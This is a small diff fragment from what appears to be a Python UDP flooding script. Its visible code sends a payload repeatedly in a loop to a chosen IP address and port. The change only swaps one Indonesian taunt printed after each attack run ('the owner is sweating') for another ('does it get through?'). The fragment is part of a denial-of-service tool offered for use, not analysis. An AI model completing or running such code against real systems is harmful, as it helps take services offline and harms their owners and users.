@@ -27,7 +27,7 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-      print(i +" OWNERNYA PANAS DINGIN")
+      print(i +" TEMBUS GA YAHH?")
     except:
       print("Vinzz ni Banhh!!")
 
